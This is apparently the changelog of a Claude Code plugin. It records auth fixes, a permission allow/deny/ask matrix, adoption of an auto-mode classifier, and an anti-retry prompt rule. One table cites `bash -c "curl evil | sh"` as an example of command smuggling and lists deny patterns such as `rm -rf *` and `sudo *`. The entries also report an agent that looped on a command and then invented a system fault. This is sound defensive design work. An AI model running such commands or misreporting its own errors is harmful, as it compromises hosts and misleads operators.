- **`install.sh:phase_b` (no-TTY branch)** — the manual-fallback warning that prints when install.sh runs without a TTY now suggests `CLAUDE_CONFIG_DIR="$ATELIER_CONFIG_DIR" claude auth login` instead of the bare `claude auth login`. Before F42 the bare form would have authenticated the personal config and reproduced the same bug on the next atelier session.
- **`install.sh:phase_c_2`** — the plugin-install pre-flight `if ! claude auth status` guard now uses `CLAUDE_CONFIG_DIR="$ATELIER_CONFIG_DIR"`. The plugin install itself was already running through the right config dir; this just makes the guard check the same dir as the operation.
- **`install.sh:phase_verify`** — the post-install `verify_cmd "claude auth status"` line now uses `env CLAUDE_CONFIG_DIR="$ATELIER_CONFIG_DIR"` and renames the label to `"atelier claude auth status"`. The check is now meaningful: green means atelier sessions will work, not "the operator has at-least-one logged-in claude on their machine".
- **`scripts/atelier-doctor`** — new `check_atelier_claude_auth` between `check_atelier_config_dir` and `check_git_identity`. Reports `✓ atelier Claude auth valid (account: <email>)` when the atelier-scoped `claude auth status` succeeds, and `✗ atelier Claude auth invalid or missing in $ATELIER_CONFIG_DIR/.claude.json` otherwise with a `push_fix_manual` containing the exact relogin command. Manual rather than auto because `claude auth login` is an interactive browser flow that cannot be silently driven by `--fix`.

**Decisions captured:**

- **Scope every `claude auth …` invocation, not just the failing one.** The operator's symptom was Phase B reporting false success, but the same blind spot was in the post-install Verification (`verify_cmd`) and in Phase C.2's pre-flight guard. Fixing only Phase B would have left a confusing intermediate state where the doctor said `✓` but the verify phase reported the personal auth. Single-axis fix across all four sites.
- **`push_fix_manual` for the doctor, not `push_fix_auto`.** The fix is `CLAUDE_CONFIG_DIR=… claude auth login`, which opens a browser tab and requires human interaction. Auto-fixes are supposed to run cleanly without operator intervention; a browser-OAuth flow cannot. Same shape as the existing `push_fix_manual` cases (e.g. legacy hooks cleanup, git-wt drift remediation).
- **No documentation update to operator-rules.md or operator-guide.md.** The "Invoking `claude` from atelier scripts (M7.1.F29)" rule already states the convention. F42 is the install.sh + doctor *enforcing* that rule, not extending it. The follow-up that *would* document is M7.1.F43 if we add a section to operator-rules.md about "two separate Claude auths (personal + atelier)" — currently deferred because the install-time `warn` already explains the split on the screen where the operator is most likely to read it.
- **Patch bump 0.8.2 → 0.8.3.** Auth wiring fix, no operator-facing UX change beyond the labels. Same precedent as F36's `current_version` comparator fix (patch bump, no release cut required to ship a tag, but the manifest stays aligned with head-of-main).

**Plugin scope:** host-OS-layer (`install.sh`) + plugin-layer (`scripts/atelier-doctor`). No agent, skill, command, hook, or template touched. Patch bump **0.8.2 → 0.8.3**.

**Verified locally:**

- `bash -n install.sh` syntax-clean post all edits.
- `bash -n scripts/atelier-doctor` syntax-clean.
- `grep -nE "claude auth (status|login|logout)" install.sh` shows every invocation now prefixed with `CLAUDE_CONFIG_DIR="$ATELIER_CONFIG_DIR"` (or `env CLAUDE_CONFIG_DIR=…` in the `verify_cmd` line which passes the env via `env <name=val> cmd…` per the existing pattern for `verify_cmd "atelier gh auth (author)"`).
- `check_atelier_claude_auth` exercised against the operator's current host: at the time of this commit the operator had already manually run `CLAUDE_CONFIG_DIR=$ATELIER_CONFIG_DIR claude /login` to unblock the storefront test, so the check reports `✓ atelier Claude auth valid (account: <email>)` — confirming the check correctly recognises the post-fix state. On a host where the atelier-scoped auth is still missing or expired, the check would surface `✗` with the relogin command.

**Operator-visible:**

After this PR merges and the operator picks up v0.8.3 via `atelier-update` (or a fresh `install.sh` run), the next `install.sh` run will:

1. **Detect missing atelier-scoped auth** even on hosts where the personal `~/.claude/` is logged in. Operator sees one of: *"atelier Claude Code already authenticated as <email>"* (existing valid token in `$ATELIER_CONFIG_DIR`), or *"starting atelier Claude Code login (a browser tab will open) — this is separate from your personal ~/.claude/ login"* (no prior atelier auth — browser opens).
2. **Refuse to install plugins in Phase C.2** if the atelier-scoped auth is missing (matches the Phase B behavior — fail loudly, give a manual fallback, do not silently proceed and let plugins land under the wrong auth).
3. **Surface the same check at the doctor level** — `atelier-doctor` reports `✓` if the auth is valid, `✗` with the exact relogin command otherwise. The operator can now diagnose 401 issues from outside any Claude session.

If the operator had previously been operating with a "valid personal auth + missing/expired atelier auth", the first `install.sh` re-run after F42 lands will detect the gap and walk them through the relogin. The 401 the operator hit on `/atelier:doctor` becomes impossible to ship past Phase B undetected.

**Follow-up paths:**

- **M7.1.F43 (deferred)** — add a section to `operator-rules.md` titled "Two Claude Code auths: personal (~/.claude/) vs atelier ($ATELIER_CONFIG_DIR/.claude.json)" explaining the split. Currently deferred because the install-time messaging covers the case in the moment the operator sees it. Promote if a second operator hits the same confusion at a different entry point (e.g. someone reading the operator-guide before running install).
- **Token-rotation observability.** F42 catches "no atelier auth" and "atelier auth invalid" at install/doctor time, but does not catch a token that becomes invalid mid-session (e.g. a long-running task that outlasts the OAuth refresh window). The proper fix is a `PostToolUse` hook that watches for 401s and surfaces a structured error to the agent, but that is M2.9-shaped work — defer until the symptom recurs in production.

### M7.1.F41 — Prune low-value `ask` rules so auto-mode classifier covers them (template diet) — 2026-05-30
**PR:** [#116](https://github.com/AkaLab-Tech/atelier/pull/116)

Captured during M2.8 (PR [#114](https://github.com/AkaLab-Tech/atelier/pull/114), v0.8.0) dogfood. After auto-mode landed in production, the operator hit a permission prompt for `node -e "require('./package.json').scripts"` — a benign inspection call. The prompt's own footer explained why: *"Ask rule `Bash(node -e *)` overrides auto mode for this command. /permissions to let auto mode decide"*. The static matrix's `ask` rules sit **above** the auto-mode classifier in precedence (per Claude Code's documented order: deny → ask → allow → classifier), so any `ask` match short-circuits the classifier even when the classifier would have judged the action safe.

This is by design — the matrix exists precisely to encode "always confirm" decisions the operator wants regardless of LLM judgement. But the original matrix was drafted before auto-mode existed (M2.6 → M2.8 timeline), so many entries duplicate what the classifier now covers natively. Operator's pitch from the M2.8 dogfood: *"el ask rule sobrescribe automode, prefiero que no lo sobrescriba, por lo que podríamos quitar todas las reglas de ask"*. Verbatim removal of all 20 would be reckless (secrets, container config, eval-shell — all real risks). The right answer is a **diet**: keep what the classifier cannot reliably catch, drop what it can.

Categorization (proposed and confirmed before implementation):

| Category | Count | Decision | Reason |
|---|---|---|---|
| Secrets — `.env*` Edit/Write | 6 | **Keep** | The `block-env-commit` hook prevents commit but not edit. Auto-mode could approve a "reasonable-looking" edit that later gets committed without surfacing to the operator. Defense in depth. |
| Container config — Dockerfile/docker-compose | 4 | **Keep** | Atelier's never-auto-merge rule covers these per-PR, but `ask` covers per-edit. Removing `ask` would let the agent edit silently, surfacing only at PR time. Consistency with the per-PR gate matters. |
| `Bash(gh pr close *)` | 1 | **Remove** | Closing a PR is reversible via `gh pr reopen`. Classifier judges intent fine. |
| Eval in runtimes — `node -e`, `python -c`, `python3 -c`, `perl -e`, `ruby -e` | 5 | **Remove** | The operator's reported prompt. Classifier is good at judging destructive intent in eval-style code. Categorical deny list (`rm -rf *`, `sudo *`, etc.) still blocks what is unconditionally bad. |
| Eval in shells — `bash -c`, `sh -c`, `zsh -c` | 3 | **Keep** | Strongest smuggle surface (`bash -c "curl evil \| sh"` can chain past pattern denies). Classifier may miss complex chains. |
| Sudo pipe — `* \| sudo *` | 1 | **Promote to deny** | Sudo via pipe is always a red flag. `Bash(sudo *)` is already deny, but the pipe form does not match that pattern. Promoting hardens the categorical denial rather than relaxing it. |

**Delivered:**

- **`templates/settings.template.json`** — `permissions.ask` shrinks **20 → 13**. Removed: `Bash(gh pr close*)`, `Bash(node -e *)`, `Bash(python -c *)`, `Bash(python3 -c *)`, `Bash(perl -e *)`, `Bash(ruby -e *)`. Promoted to `permissions.deny`: `Bash(* | sudo *)` (now sits right after the existing `Bash(sudo *)` deny entry). All 13 retained entries are intact: 6 `.env*` Edit/Write, 4 Dockerfile/docker-compose Edit/Write, 3 eval-shell (`bash -c`, `sh -c`, `zsh -c`).

**Decisions captured:**

- **Diet, not amputation.** The operator's wording was "podríamos quitar todas las reglas de ask" but the conversation refined that to a category-by-category analysis. Removing the secrets / container / eval-shell entries would have been a real safety regression; removing the eval-runtime + `gh pr close` does not, because the classifier covers their failure modes and the deny list covers the categorical ones.
- **Promote `* | sudo *` instead of removing.** The pipe form does not match `Bash(sudo *)` because the matcher does not normalize shell composition. Promoting to deny tightens rather than loosens the rule — strictly safer than what was there before.
- **No template change beyond the 6 removals + 1 promotion.** Specifically did not touch the allow list, additionalDirectories, deny list (other than the promotion), or the per-task `<worktree>` scoping. Single-axis change makes the operator's "did auto-mode pick this up?" verification easy: any `node -e` prompt post-F41 is a real signal that auto-mode is not active, not a leftover from a forgotten ask entry.
- **No update to operator-rules.md or docs/operator-guide.md.** The auto-mode UX explanation that landed in M2.8 already says *"You may still see the occasional permission prompt — for commands the classifier is genuinely unsure about (touching `package.json`, `Dockerfile`, deploy paths, etc.). That's working as designed."* That paragraph stays accurate after F41 because the kept `ask` entries cover exactly those cases (`.env*`, Dockerfile, docker-compose, eval-shell). The removed ones were not promised to the operator anywhere.
- **F40 still queued.** F39's anti-retry rule + F41's ask diet are independent. If the same identical-invocation loop recurs on a different code path post-F41, F40 (the `PostToolUse` hook with duplicate detection) is still the planned defense in depth.

**Plugin scope:** plugin-layer change to `templates/settings.template.json` only. No agent, skill, command, hook, script, install.sh, or doctor touched. Existing project worktrees still carry the pre-F41 `.claude/settings.json` instantiated from the old template; F38's drift auto-resync regenerates them on the next `/atelier:setup-project` invocation per project. Plugin patch bump **0.8.1 → 0.8.2** per PLAN.md §14.2 (permission matrix refinement, no new capability, no install-time behavior change).

**Verified locally:**

- `jq empty templates/settings.template.json` — valid JSON.
- `jq -r '.permissions.ask | length' templates/settings.template.json` — returns `13` (down from 20).
- `jq -r '.permissions.deny[] | select(test("sudo"))' templates/settings.template.json` — returns both `Bash(sudo *)` and `Bash(* | sudo *)` (the promotion landed in the right list).
- `jq -r '.permissions.ask[]' templates/settings.template.json` — enumerated; each of the 13 expected entries is present, none of the 7 removed entries appears.

**Operator-visible:**

After this PR merges and the operator picks up v0.8.2 via `atelier-update`, the next `task` invocation regenerates `<project>/.claude/settings.json` from the refreshed template (F38 drift detector). From then on:

- `node -e "<expr>"`, `python -c "<expr>"`, `python3 -c "<expr>"`, `perl -e`, `ruby -e` — all classifier-judged. Inspection scripts the agent reaches for run silently.
- `gh pr close <N>` — classifier-judged. Operator confirms via the GitHub UI, not a Claude prompt.
- `*  | sudo *` — categorically blocked before the classifier sees it.

Still prompt by design:

- Any `.env*` edit/write.
- Any `Dockerfile` / `docker-compose*` edit/write.
- `bash -c`, `sh -c`, `zsh -c` evaluation.

**Follow-up paths:**

- **Empirical check post-F41.** Operator confirms the M2.8 dogfood prompt (`node -e "require('./package.json')..."`) no longer fires. If it does, that's a signal the kept `ask` entries are matching something we did not expect (path-normalisation, glob expansion, etc.) — not a bug in F41 itself but worth logging.
- **M7.1.F40** — still queued (anti-retry `PostToolUse` hook). Independent of F41.

### M7.1.F39 — Anti-retry rule for Bash output truncation across agents/skills/commands — 2026-05-30
**PR:** [#115](https://github.com/AkaLab-Tech/atelier/pull/115)

Discovered immediately after M2.8 (PR [#114](https://github.com/AkaLab-Tech/atelier/pull/114), v0.8.0) was merged and the operator started exercising auto-mode in production. While inspecting `/atelier:status` against the storefront project, the operator caught the agent invoking `git wt list 2>&1 || echo "GITWT_FAILED"` **six consecutive times**, each returning exit 0 with the same valid output. The operator had to Ctrl+C to break the loop; when asked why it stalled, the agent rationalised the duplicates as *"el sistema duplicó varias de mis llamadas"* — a post-hoc explanation. The system did not duplicate anything; the agent re-invoked the same command because it saw the Bash tool's UI collapse marker (`… +8 lines (ctrl+o to expand)`) and interpreted the truncation as *"I didn't get the full output, retry"* — pure model-side reasoning failure.

This is a class of bug that auto-mode (M2.8) makes *less visible*: pre-auto-mode every retry would have surfaced a permission prompt, giving the operator six chances to interrupt the loop before the seventh call. With auto-mode the classifier silently approves each identical invocation, so the operator only notices once the bucle is obvious enough to interrupt. Auto-mode bought speed at the cost of the implicit "fail loud" the permission prompts used to provide.

**Delivered:**

- **`commands/status.md`** — new section "Bash output handling — never retry on success (M7.1.F39)" between the read-only directive and "## What to collect". Captures the rule in three sentences plus an inline reminder for the worktree probe in section 2 (the specific code path that loop-fired in the dogfood report). Lives at the top of the body so it loads before the agent reads the rest of the prompt.
- **`agents/task-orchestrator.md`** — same rule, inserted between the introductory paragraph and the existing "## Operating context — your cwd is NOT inside the worktree" section. Phrasing slightly broader to cover the orchestrator's full Bash surface (worktree state queries, `git status` runs, `gh pr view` calls, environment probes).
- **`skills/task-discovery/SKILL.md`** — same rule as a blockquote between the title sentence and "## What this skill produces". Slightly more focused phrasing on the skill's actual call surface (`git wt list`, `git -C <path> status --porcelain`, `Read` against `ROADMAP.md`).

Why these three files and not all 11 Bash-heavy callers: the dogfood report cited `/atelier:status` specifically; `task-orchestrator` is the single biggest consumer of Bash queries across the lifecycle; `task-discovery` is the skill `/atelier:status` and `task-orchestrator` both call when they need to inspect worktree state. Covering the three highest-leverage surfaces first lets us measure whether the rule alone is enough (Option A in the dogfood conversation) before broadcasting it to every command and agent (which would dilute each file's specific instructions). If F39 does not eliminate the loop, M7.1.F40 ships a `PostToolUse` hook that detects identical successive Bash invocations and surfaces a structured warning back to the agent (Option B).

**Decisions captured:**

- **Same wording in all three files.** Resisted the temptation to tailor the phrasing per file. The rule is identical across surfaces; same wording reduces the chance of one file's slightly-different version creating a loophole the agent latches on to.
- **Rule placement near the top of each file.** Right after the role/purpose sentence, before any procedural instructions. Models tend to weight earlier instructions more heavily; the rule needs to land before the agent reads the steps that would otherwise produce the loop.
- **Reference M7.1.F39 explicitly in the rule heading.** Future readers see the linkage to the dogfood report and the addendum trail in HISTORY without having to git-blame.
- **No `PostToolUse` hook yet.** The operator explicitly asked for "Option A first, B if A doesn't work." Same call: ship the cheapest fix with the highest chance of resolving the symptom; only escalate to the harder option (hook with state tracking) if the symptom persists.
- **No fix to the agent's post-hoc rationalisation.** The agent saying *"el sistema duplicó mis llamadas"* is the easier symptom to confuse for the real bug. We're not patching the rationalisation pathway because (a) the rule above prevents the loop in the first place, removing the need to rationalise, and (b) instructing the agent to *not invent system-side failures* would be a much broader prompt change with unclear cost.

**Plugin scope:** plugin-layer changes only (commands + agent + skill). No template, install.sh, or doctor touched. Plugin patch bump **0.8.0 → 0.8.1** per PLAN.md §14.2 — model-behavior nudge, no operator-visible UX surface or config change.

**Verified locally:**

- All three files still parse as markdown (no broken sections, no half-closed blockquotes).
- The new section in `commands/status.md` sits before "## What to collect" and references section 2 explicitly — both the placement and the cross-reference are intentional anchors for the agent to find.
- The new section in `agents/task-orchestrator.md` sits between the intro paragraph and "## Operating context" — preserves the existing flow.
- `skills/task-discovery/SKILL.md` blockquote sits between the one-line description and "## What this skill produces" — visually distinct (`>` markdown blockquote) so it reads as a constraint, not a step.

**Operator-visible:**

After this PR merges and the operator picks up v0.8.1 via `atelier-update`, the next time they invoke `/atelier:status`, `/next-task`, or `/resume-task` (which dispatches `task-orchestrator`) the loaded prompts include the anti-retry rule. The agents that the operator caught looping in the M2.8 dogfood — specifically `/atelier:status` re-invoking `git wt list` — should stop looping. If the symptom recurs on a different command path, that's the signal to ship F40 (the `PostToolUse` hook with identical-invocation detection).

**Follow-up paths:**

- **M7.1.F40 — `PostToolUse` hook with identical-invocation detection.** Defensive layer above F39. Only ship if F39 does not fully resolve the loop class. Same shape as the existing M2.4 hook suite: a small Bash script reading the last N Bash invocations from `<worktree>/.task-log/`, comparing the proposed call against them, and emitting a structured warning if it matches. The agent would receive the warning in its next turn and presumably adjust.
- **M7.1.F41 — Evaluate removing the static `ask` rules from `templates/settings.template.json` and letting auto-mode decide every non-allow/non-deny case.** Operator request captured during the M2.8 dogfood: *"el ask rule sobrescribe automode, prefiero que no lo sobrescriba, por lo que podríamos quitar todas las reglas de ask"*. Plugin scope: template change + potential M2.4 hook coverage gap analysis. Discussion needed before implementing.

### M2.8 — Adopt Claude Code's native auto permission mode as layer 3 — 2026-05-29
**PR:** [#114](https://github.com/AkaLab-Tech/atelier/pull/114)

Closes M2.8 (ROADMAP). Ships the adoption work greenlit by M2.7's empirical validation (PR [#113](https://github.com/AkaLab-Tech/atelier/pull/113)): atelier-launched Claude Code sessions now run with `defaultMode: "auto"`, which replaces the operator-prompt friction for compound bash, shell loops, and unenumerated commands with Anthropic's classifier. The deny list, allow list, and per-task `additionalDirectories` scoping all carry over unchanged — auto-mode is a second gate that composes with the existing static matrix, not a replacement.

**Delivered:**

- **`templates/settings.template.json`** — removed `"defaultMode": "acceptEdits"` from the `permissions` block. Project-level `defaultMode` overrides user-level by normal merge precedence; leaving the project line would have masked the user-level `auto`. The allow / deny / ask blocks and `additionalDirectories` are untouched.
- **`install.sh`** — new Phase C.1 step `phase_c_1_atelier_auto_mode` writes `{"permissions": {"defaultMode": "auto"}}` into `$ATELIER_CONFIG_DIR/settings.json` via `jq` merge, preserving existing keys (`enabledPlugins`, `extraKnownMarketplaces`, `theme`, etc.) and skipping silently if the value is already in place. Idempotent across re-runs. Registered between `phase_c_1_atelier_help_file` (M7.1.F34) and `phase_c_1_shellrc_hooks` so the setting lands before the operator's first atelier session.
- **`scripts/atelier-doctor`** — new check `check_atelier_auto_mode` reads `$ATELIER_CONFIG_DIR/settings.json`, verifies `.permissions.defaultMode == "auto"`, reports `✓`/`✗`. The remediation is registered as `push_fix_auto` so `atelier-doctor --fix` writes the setting if missing (jq merge + atomic mv, same shape as the install.sh helper).
- **`operator-rules.md`** — new section "Permission model: layer 3 is auto-mode (M2.8)" describing what changes for the operator (Bash command coverage, shell control flow), what stays the same (deny list, allow short-circuit, additionalDirectories scope), the install-time write, and the disable path (edit `$ATELIER_CONFIG_DIR/settings.json` and flip `.permissions.defaultMode` back to `acceptEdits`). Cross-references the research artifact.
- **`docs/operator-guide.md`** — new "About permission prompts (auto-mode)" section between "What atelier will and won't do" and "Keep atelier up to date". Operator-facing framing: what disappears (compound bash prompts, `for`/`while` shell-syntax prompts, gh subcommand enumeration gaps), what still prompts legitimately (touching `package.json`, `Dockerfile`, deploy paths), how to verify (`/status` → Config → Default permission mode).
- **`docs/troubleshooting.md`** — new entry "Auto-mode classifier still prompts for an unexpected command" between the fork-bomb guard and the pnpm release-age entries. Covers the two prompt sources that remain (static `ask` matrix + classifier judgement), and the three fix tiers (accept once, project-local allow, machine-level disable).

**Decisions captured:**

- **No `defaultMode` in the project template.** The simplest path the M2.7 addendum identified: removing the project-level `defaultMode: acceptEdits` line lets user-level `defaultMode: auto` flow through the normal settings merge. Tested in OQ-B with a project file that omitted `defaultMode` — composition worked as documented. Trying to keep the project `defaultMode` and rely on it being "more specific" would have been backwards: project always wins, so the project line would have masked auto-mode.
- **Auto-mode in user-level config, never per-project.** The doctor check and the install.sh write both target `$ATELIER_CONFIG_DIR/settings.json`, not any project file. The security guard against repos granting themselves auto-mode (`auto` is ignored from `.claude/settings.json` and `.claude/settings.local.json`) actually helps atelier here: the setting lives in one well-known place, and projects cannot accidentally turn it off (or on) without touching the user-level config the operator chose.
- **`push_fix_auto` for the doctor remediation.** The fix is a deterministic `jq` merge + atomic `mv` — exactly the kind of operation `--fix` is meant to apply without operator intervention. Same pattern as the F30 plumbing for the templates symlink + shellrc + marketplace fixes.
- **No operator-facing wrapper command.** Considered adding `atelier-enable-auto-mode` / `atelier-disable-auto-mode` helpers for explicit on/off. Rejected — `atelier-doctor --fix` covers the "turn it on" case, and the disable path is a one-line manual edit. Adding wrappers would create two ways to do the same thing and a third surface for atelier-update to keep in sync.
- **Minor bump 0.7.6 → 0.8.0, not patch.** Operator-visible UX change material enough to telegraph. The prior 0.x cuts have all been "ships a new helper/script/agent" patches; this one *changes the per-task interactive experience* for every atelier session on every machine that installs v0.8.0+. Minor bump is the right SemVer signal. Releases will cut `v0.8.0` after merge.

**Plugin scope:** plugin-layer (template + scripts) + host-OS-layer (install.sh). No agent, skill, command, or hook touched. Plugin minor bump **0.7.6 → 0.8.0** per PLAN.md §14.2.

**Verified locally:**

- `bash -n install.sh` syntax-clean. New `phase_c_1_atelier_auto_mode` function passes the same shape checks as the existing Phase C.1 steps.
- `bash -n scripts/atelier-doctor` syntax-clean. New `check_atelier_auto_mode` follows the established `push_host` + `push_fix_auto` shape.
- Template still parses as JSON after the `defaultMode` removal: `jq empty templates/settings.template.json` exits 0.
- Doctor's auto-mode check exercised inline against the operator's current `~/.claude-work/settings.json` (pre-install of v0.8.0): reports the `defaultMode` as `(unset)`, confirming the check correctly identifies the missing-setting case the doctor will surface on existing hosts upgrading through v0.8.0.

**Operator-visible:**

After this PR merges, the operator runs `cd ~/atelier && git pull && ./install.sh` once (per the standard upgrade flow). The Phase C.1 step writes `defaultMode: "auto"` into `$ATELIER_CONFIG_DIR/settings.json`. From the next `task` invocation onwards:

- Compound Bash like `cd /path && git fetch && gh pr view <N>` runs without a prompt (the classifier judges it).
- `for p in dir1 dir2; do git -C "$p" …; done` runs without a prompt (was the symptom that motivated the entire M2.6 + M2.7 + M2.8 chain).
- `gh pr checks <N>`, `gh pr review --approve`, and other gh subcommands the static matrix did not enumerate are classifier-judged instead of asked.

Prompts that remain by design:

- Anything in the existing `deny` list — blocked categorically, classifier never sees it.
- Anything in the `ask` list — operator-confirmed always (touching `package.json`, `Dockerfile`, etc.).
- Compound bash that the classifier itself decides is ambiguous (e.g. multiple state-touching ops chained together with `&&`/`||` against unfamiliar paths) — the classifier may still ask, by design.

`atelier-doctor` reports the new check; `atelier-doctor --fix` enables auto-mode on hosts that upgraded through v0.8.0 without re-running `install.sh`.

**Follow-up paths:**

- **M2.9** (queued in ROADMAP) — custom `PreToolUse` Haiku hook as a targeted second layer for the high-risk surface (anything touching `pnpm-lock.yaml`, deploy paths, never-auto-merge files). Gated on ≥ 10 merged tasks under auto-mode + observable residual FN incidents.
- **Storefront retest.** The operator can re-run the original M7.1 dogfood-5 scenario (the `for` loop that surfaced as a friction prompt, the compound `git fetch + gh pr view` from the post-M2.7 storefront session) and verify the prompts no longer fire.
- **PR #112 / #113 cleanup nit.** Both are docs-only research artifacts. They appear in this `HISTORY.md` block as the validation thread that led to M2.8; no behavioral change in either is being revisited.

### M2.7 — Empirical validation of the auto-mode adoption path: OQ-A + OQ-B + OQ-C all favorable — 2026-05-29
**PR:** [#113](https://github.com/AkaLab-Tech/atelier/pull/113)

Closes M2.7 (ROADMAP). Runs the three open questions that M2.6 left conditional, on a real host (macOS 25.5.0, Claude Code v2.1.156, model `claude-opus-4-8[1m]`). All three resolve favorably — the M2.6 conditional is now resolved, and adoption of auto-mode is greenlit.

**Tests performed (full data in [docs/research/permission-layer-3.md §Addendum](docs/research/permission-layer-3.md)):**

- **OQ-A — `CLAUDE_CONFIG_DIR` and `defaultMode: "auto"`.** Created `/tmp/cc-oqa-test/settings.json` with `{"permissions": {"defaultMode": "auto"}}` + copied OAuth state from `~/.claude-work/.claude.json` to bypass interactive login. Launched `cd /tmp/cc-oqa-cwd && CLAUDE_CONFIG_DIR=/tmp/cc-oqa-test claude` from a clean cwd. `/status` Config tab reported `Default permission mode: Auto mode`; Status tab reported `Setting sources: User settings`. **Resolution: favorable.** Claude Code reads `defaultMode: "auto"` from the user-level config wherever `CLAUDE_CONFIG_DIR` points; the docs' literal `~/.claude/settings.json` reference is shorthand for "the active user-level config dir", not a hardcoded path.
- **OQ-B — Issue #55507 reproduction.** Created `/tmp/cc-oqb-cwd/.claude/settings.json` with `{"permissions": {"allow": ["Bash(echo *)"]}}` (a project-level `permissions` block with no `defaultMode` of its own — the precise condition the issue reports as broken). Re-launched with the same `CLAUDE_CONFIG_DIR`. `/status` Config tab still reported `Default permission mode: Auto mode`; Status tab now reported `Setting sources: User settings, Shared project settings` (both layers merged). **Resolution: favorable.** Issue #55507 does not reproduce on Claude Code v2.1.156 — either fixed upstream or the original repro conditions were narrower than the issue describes. Atelier's `templates/settings.template.json`'s `permissions` block will not invalidate user-level auto-mode in production.
- **OQ-C — Auto-mode covers the shell-syntax branch.** Temporarily added `{"permissions": {"defaultMode": "auto"}}` to `~/.claude-work/settings.json` (backed up to `settings.json.oqc-bak`, restored at the end) so the operator's real `atelier` shell wrapper would launch a session with auto-mode active under `CLAUDE_CONFIG_DIR=$ATELIER_CONFIG_DIR` end-to-end. Launched `cd /tmp/cc-oqa-cwd && atelier`. Confirmed `/status` Config: `Default permission mode: Auto mode`. Instructed Claude: *"Run this bash command using the Bash tool: `for p in foo bar baz; do echo "$p"; done`"*. Observed output included the literal annotation **"Allowed by auto mode classifier"** below the Bash call, followed by `foo / bar / baz` — no interactive prompt, no *"Contains shell syntax (string) that cannot be statically analyzed"* friction. **Resolution: favorable.** Auto-mode's classifier intercepts the static-analysis-bypass branch. Adopting auto-mode closes both the F37-style enumeration gaps and the shell-loop friction in one move.

**Decisions captured:**

- **Adoption is no longer conditional.** The three OQs resolved favorably; the M2.6 doc's "adopt-with-template-change" branch is the one we take. M2.8 is queued in ROADMAP as the implementation work; M2.9 (originally PLAN.md §11 v2.3) is the targeted second-layer hook, deferred until after M2.8 has shipped and the residual high-risk surface is observable in production.
- **OQ-B was tested with a no-`defaultMode` project block to isolate issue #55507 from normal precedence.** Putting `defaultMode: acceptEdits` in the project file would have nubbed the test — that would have been a normal override case (project wins) rather than the silent-drop pathology issue #55507 describes. The M2.8 scope explicitly removes `defaultMode: acceptEdits` from `templates/settings.template.json` to let the user-level `auto` through; OQ-B confirmed that removing it is safe (the rest of the project's `permissions` block still merges correctly).
- **Test harness used `~/.claude-work/.claude.json` for OAuth.** Claude Code v2.1+ stores OAuth state in `.claude.json`, not in macOS Keychain. Copying the file from the operator's atelier config dir to the test config dir let the test run without interactive login. The token rotated after the OQ-B session closed, blocking a re-launch — switching to the temporary-patch path for OQ-C (using the operator's real `atelier` wrapper) was both cleaner and a better fidelity to the real adoption scenario.
- **`~/.claude-work/settings.json.oqc-bak` was restored at end of OQ-C.** No persistent state changes on the operator's host.

**Plugin scope:** documentation only — addendum to the existing research artifact + PLAN.md §11 v2.3 update + ROADMAP transitions (M2.7 closed, M2.8 added, M2.9 added). No agent, skill, command, hook, script, or template touched. Plugin patch bump **0.7.5 → 0.7.6** per PLAN.md §14.2 (docs-only, no release cut). The next release (cut by M2.8) will be **v0.8.0** — minor bump because the operator-visible UX changes materially (no more permission prompts for shell loops or for commands within the deny-respecting envelope).

**Verified locally:**

- `docs/research/permission-layer-3.md` Addendum section exists with OQ-A/B/C tests, observed outputs (including the literal "Allowed by auto mode classifier" annotation), and resolutions.
- PLAN.md §11 v2.3 carries the validated decision: "Option C — adopt Claude Code's native `auto` permission mode as the primary layer 3. The M2.6 conditional is resolved: OQ-A/B/C all favorable on Claude Code v2.1.156."
- ROADMAP: M2.7 removed; M2.8 (adoption work) and M2.9 (custom hook second layer) added with concrete scope and acceptance criteria.
- `~/.claude-work/settings.json` restored to its pre-OQ-C state (the operator can verify with `jq '.permissions // "(no permissions block)"' ~/.claude-work/settings.json` → reports the no-block string).

**Follow-up paths:**

- **M2.8** — adoption implementation: remove `defaultMode: acceptEdits` from the template, write the user-level `defaultMode: auto` from `install.sh`, doctor-check + `--fix`, operator-facing docs. Plugin minor bump 0.7.x → 0.8.0; release v0.8.0.
- **M2.9** — custom `PreToolUse` Haiku hook as a targeted second layer for residual high-risk operations. Gated on M2.8 reaching production and producing observable residual FN incidents (target: ≥ 10 merged tasks under auto-mode before deciding whether M2.9 is worth the work).

### M2.6 — Permission layer-3 spike: native auto-mode vs custom `PreToolUse` LLM hook — 2026-05-29
**PR:** [#112](https://github.com/AkaLab-Tech/atelier/pull/112)

Closes M2.6 (ROADMAP) by producing the research artifact required by its acceptance criteria. Triggered by two friction patterns surfaced during M7.1 dogfood-5 (F37 + the `for … do … done` shell-syntax prompt the operator hit after F38 merged): atelier's static allow/deny/ask matrix in `templates/settings.template.json` cannot cover (a) enumeration gaps for new helpers/aliases or (b) bash control flow that the matcher refuses to statically analyse.

**Delivered:**

- **[docs/research/permission-layer-3.md](docs/research/permission-layer-3.md)** — full research artifact with Q1-Q4 findings (composition with the static matrix, per-task vs global scope, the 17% FN profile, latency), three open questions deferred to M2.7 (OQ-A `CLAUDE_CONFIG_DIR` scope, OQ-B issue #55507 reproduction, OQ-C shell-loop behaviour under auto-mode), recommendation **Option C — adopt Claude Code's native `auto` permission mode as primary layer 3 + keep PLAN.md §11 v2.3 (`PreToolUse` Haiku hook) as a targeted second layer for the high-risk surface**, conditional on the OQ-A/B/C validation, and a phased implementation plan covering both the favorable and unfavorable resolution paths.
- **[PLAN.md](PLAN.md) §11 v2.3** — updated with `Decided in: docs/research/permission-layer-3.md` and the picked option (Option C, conditional). The custom hook is no longer "the v2.3 implementation"; it is now "the targeted second layer above auto-mode, tracked separately as a future M2.8 if and when adoption of auto-mode reaches production". §11 v2.3 also captures the FN profile context (concentrated in Tier-2 file edits and ambiguous-consent Bash, both of which atelier already scopes via `additionalDirectories` + deny list) so future readers don't have to re-walk the spike to understand why the recommendation lands where it does.
- **[ROADMAP.md](ROADMAP.md)** — `M2.6` removed (closed by this PR), `M2.7 — Empirically validate the auto-mode adoption path` added as the empirical-validation half of the spike. M2.7 enumerates OQ-A/B/C with concrete reproduction steps and the addendum target inside `docs/research/permission-layer-3.md`.

**Findings (one-line each, full detail in the doc):**

- **Q1 — Composition.** Auto-mode composes on top of the static matrix; `deny` and `allow` rules still take precedence; the classifier only fires on `ask` or unenumerated actions. Atelier's existing deny-list survives intact under auto-mode. **High confidence**, official Anthropic docs.
